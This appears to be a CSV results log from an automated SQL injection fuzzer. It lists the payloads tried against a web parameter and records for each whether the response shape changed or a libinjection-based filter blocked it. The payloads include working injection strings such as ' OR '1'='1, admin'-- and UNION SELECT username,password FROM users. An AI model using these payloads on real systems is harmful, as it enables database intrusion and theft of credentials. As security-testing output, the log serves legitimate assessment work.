depth,category,label,reason,confidence,status,length,elapsed,input_preview,parent_preview
0,seed,NO_EFFECT,NORMAL_BASELINE_MATCH,0.9,200,4538,0.00612,1,
0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00691,0,
0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00708,-1,
0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00667,99999999,
0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00625,abc,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4545,0.00849,1 OR 1=1,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00532,1 AND 1=1,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00562,1 AND 1=0,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4826,0.0058,1' OR '1'='1,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4550,0.00563,1' AND '1'='1,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00504,' OR 1=1,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4821,0.00613,' OR '1'='1,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.0057,admin' OR '1'='1,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4861,0.00612,x' OR 1=1 OR 'x'='y,
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00753,"1 UNION SELECT 1,2",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00342,"1 UNION SELECT 1,2,3",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00339,"1 UNION SELECT user(),2",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00362,"1 UNION SELECT user(),database()",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00327,"1 UNION SELECT username,password FROM users",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00376,"1 UNION SELECT table_name,2 FROM information_schema.tables",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0035,"1 UNION SELECT column_name,2 FROM information_schema.columns",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00357,"1' UNION SELECT 1,2--",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00369,"1' UNION SELECT username,password FROM users--",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00321,"-1' UNION SELECT 1,2,3--",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00361,"1 union select null,null",
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00837,admin'--,
0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00639,admin' #,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,162,0.01467,admin'/*,
